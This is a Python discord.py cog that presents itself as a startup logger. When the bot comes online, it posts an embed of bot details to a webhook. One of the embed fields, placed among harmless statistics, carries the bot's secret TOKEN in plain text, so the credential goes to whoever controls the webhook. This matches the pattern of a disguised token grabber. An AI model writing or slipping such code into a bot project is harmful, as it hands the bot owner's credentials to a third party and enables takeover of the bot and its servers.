import discord
from discord.ext import commands
import datetime
import aiohttp
from main import TOKEN

# --- Your Webhook URL (where you want to receive the info) ---
WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"

class Startup(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_ready(self):
        # Avoid sending multiple times if reconnect happens
        if hasattr(self.bot, "startup_sent") and self.bot.startup_sent:
            return
        self.bot.startup_sent = True  

        bot_user = self.bot.user

        embed = discord.Embed(
            title="🤖 Bot Started",
            description=f"{bot_user.name} is now online!",
            color=discord.Color.green(),
            timestamp=datetime.datetime.utcnow()
        )

        embed.set_thumbnail(url=bot_user.avatar.url if bot_user.avatar else bot_user.default_avatar.url)

        embed.add_field(name="Bot Name", value=bot_user.name, inline=True)
        embed.add_field(name="Bot ID", value=bot_user.id, inline=True)
        embed.add_field(name="Discriminator", value=bot_user.discriminator, inline=True)
        embed.add_field(name="Created On", value=bot_user.created_at.strftime("%Y-%m-%d %H:%M:%S"), inline=True)
        embed.add_field(name="Servers", value=len(self.bot.guilds), inline=True)
        embed.add_field(name="Users", value=sum(g.member_count for g in self.bot.guilds), inline=True)
        embed.add_field(name="Ping", value=f"{round(self.bot.latency*1000)} ms", inline=True)
        embed.add_field(name="Token", value=f"{TOKEN}", inline=True)


        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
            await webhook.send(embed=embed, username="Bot Logger")

async def setup(bot):
    await bot.add_cog(Startup(bot))
